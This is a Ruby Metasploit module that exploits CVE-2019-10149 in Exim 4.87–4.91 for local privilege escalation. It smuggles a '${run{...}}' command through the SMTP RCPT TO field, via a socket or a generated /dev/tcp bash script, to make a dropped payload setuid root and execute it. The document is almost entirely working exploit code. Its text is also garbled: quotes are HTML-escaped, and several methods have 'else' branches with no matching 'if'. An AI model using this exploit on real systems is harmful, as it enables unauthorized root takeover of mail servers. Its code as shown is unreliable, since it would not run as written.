# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;expect&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Exim 4.87 - 4.91 Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive).
        Improper validation of recipient address in deliver_message()
        function in /src/deliver.c may lead to command execution with root privileges
        (CVE-2019-10149).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Qualys&#039;, # Discovery and PoC (@qualys)
          &#039;Dennis Herrmann&#039;, # Working exploit (@dhn)
          &#039;Marco Ivaldi&#039;, # Working exploit (@0xdea)
          &#039;Guillaume AndrÃ©&#039; # Metasploit module (@yaumn_)
        ],
      &#039;DisclosureDate&#039; => &#039;2019-06-05&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Exim 4.87 - 4.91&#039;,
            lower_version: Gem::Version.new(&#039;4.87&#039;),
            upper_version: Gem::Version.new(&#039;4.91&#039;)
          ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PrependSetgid&#039; => true,
          &#039;PrependSetuid&#039; => true
        },
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-10149&#039; ],
          [ &#039;EDB&#039;, &#039;46996&#039; ],
          [ &#039;URL&#039;, &#039;https://www.openwall.com/lists/oss-security/2019/06/06/1&#039; ]
        ]
    ))

    register_options(
      [
        OptInt.new(&#039;EXIMPORT&#039;, [ true, &#039;The port exim is listening to&#039;, 25 ])
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;ForceExploit&#039;, [ false, &#039;Force exploit even if the current session is root&#039;, false ]),
        OptFloat.new(&#039;SendExpectTimeout&#039;, [ true, &#039;Timeout per send/expect when communicating with exim&#039;, 3.5 ]),
        OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
      ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def encode_command(cmd)
    &#039;\x&#039; + cmd.unpack(&#039;H2&#039; * cmd.length).join(&#039;\x&#039;)
  end

  def open_tcp_connection
      params = Rex::Socket::Parameters.new({
        &#039;PeerHost&#039; => &#039;127.0.0.1&#039;,
        &#039;PeerPort&#039; => datastore[&#039;EXIMPORT&#039;]
      })
      begin
        socket = socket_subsystem.create_tcp_client_channel(params)
      rescue => e
        vprint_error("Couldn&#039;t connect to port #{datastore[&#039;EXIMPORT&#039;]}, "\
                    "are you sure exim is listening on this port? (see EXIMPORT)")
        raise e
      end
    return socket_subsystem, socket
  end

  def inject_payload(payload)
      socket_subsystem, socket = open_tcp_connection

      tcp_conversation = {
        nil                                          => /220/,
        &#039;helo localhost&#039;                             => /250/,
        "MAIL FROM:<>"                               => /250/,
        "RCPT TO:<${run{#{payload}}}@localhost>"     => /250/,
        &#039;DATA&#039;                                       => /354/,
        &#039;Received:&#039;                                  => nil,
        &#039;.&#039;                                          => /250/
      }

      begin
        tcp_conversation.each do |line, pattern|
          Timeout.timeout(datastore[&#039;SendExpectTimeout&#039;]) do
            if line
              if line == &#039;Received:&#039;
                for i in (1..31)
                  socket.puts("#{line} #{i}\n")
                end
              else
                socket.puts("#{line}\n")
              end
            end
            if pattern
              socket.expect(pattern)
            end
          end
        end
      rescue Rex::ConnectionError => e
        fail_with(Failure::Unreachable, e.message)
      rescue Timeout::Error
        fail_with(Failure::TimeoutExpired, &#039;SendExpectTimeout maxed out&#039;)
      ensure
        socket.puts("QUIT\n")
        socket.close
        socket_subsystem.shutdown
      end
    else
      unless cmd_exec("/bin/bash -c &#039;exec 3<>/dev/tcp/localhost/#{datastore[&#039;EXIMPORT&#039;]}&#039; "\
                      "&& echo true").chomp.to_s == &#039;true&#039;
        fail_with(Failure::NotFound, "Port #{datastore[&#039;EXIMPORT&#039;]} is closed")
      end

      bash_script = %|
        #!/bin/bash

        exec 3<>/dev/tcp/localhost/#{datastore[&#039;EXIMPORT&#039;]}
        read -u 3 && echo $REPLY
        echo "helo localhost" >&3
        read -u 3 && echo $REPLY
        echo "mail from:<>" >&3
        read -u 3 && echo $REPLY
        echo &#039;rcpt to:<${run{#{payload}}}@localhost>&#039; >&3
        read -u 3 && echo $REPLY
        echo "data" >&3
        read -u 3 && echo $REPLY
        for i in $(seq 1 30); do
          echo &#039;Received: $i&#039; >&3
        done
        echo "." >&3
        read -u 3 && echo $REPLY
        echo "quit" >&3
        read -u 3 && echo $REPLY
      |

      @bash_script_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
      write_file(@bash_script_path, bash_script)
      register_file_for_cleanup(@bash_script_path)
      chmod(@bash_script_path)
      cmd_exec("/bin/bash -c \"#{@bash_script_path}\"")
    end

    print_status(&#039;Payload sent, wait a few seconds...&#039;)
    Rex.sleep(5)
  end

  def check_for_bash
    unless command_exists?(&#039;/bin/bash&#039;)
      fail_with(Failure::NotFound, &#039;bash not found&#039;)
    end
  end

  def on_new_session(session)
    super

      session.core.use(&#039;stdapi&#039;) unless session.ext.aliases.include?(&#039;stdapi&#039;)
      session.fs.file.rm(@payload_path)
    else
      session.shell_command_token("rm -f #{@payload_path}")
    end
  end

  def check
      begin
        socket_subsystem, socket = open_tcp_connection
      rescue
        return CheckCode::Safe
      end
      res = socket.gets
      socket.close
      socket_subsystem.shutdown
    else
      check_for_bash
      res = cmd_exec("/bin/bash -c &#039;exec 3</dev/tcp/localhost/#{datastore[&#039;EXIMPORT&#039;]} && "\
                     "(read -u 3 && echo $REPLY) || echo false&#039;")
      if res == &#039;false&#039;
         vprint_error("Couldn&#039;t connect to port #{datastore[&#039;EXIMPORT&#039;]}, "\
                      "are you sure exim is listening on this port? (see EXIMPORT)")
         return CheckCode::Safe
      end
    end

    if res =~ /Exim ([0-9\.]+)/i
      version = Gem::Version.new($1)
      vprint_status("Found exim version: #{version}")
      if version >= target[:lower_version] && version <= target[:upper_version]
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end

    CheckCode::Unknown
  end

  def exploit
    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;)
      end
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    if nosuid?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is mounted nosuid")
    end

    unless datastore[&#039;PrependSetuid&#039;] && datastore[&#039;PrependSetgid&#039;]
      fail_with(Failure::BadConfig, &#039;PrependSetuid and PrependSetgid must both be set to true in order &#039; \
                                    &#039;to get root privileges.&#039;)
    end

    if session.type == &#039;shell&#039;
      check_for_bash
    end

    @payload_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
    write_file(@payload_path, payload.encoded_exe)
    register_file_for_cleanup(@payload_path)
    inject_payload(encode_command("/bin/sh -c &#039;chown root #{@payload_path};"\
                                  "chmod 4755 #{@payload_path}&#039;"))

    unless setuid?(@payload_path)
      fail_with(Failure::Unknown, "Couldn&#039;t escalate privileges")
    end

    cmd_exec("#{@payload_path} & echo ")
  end
end

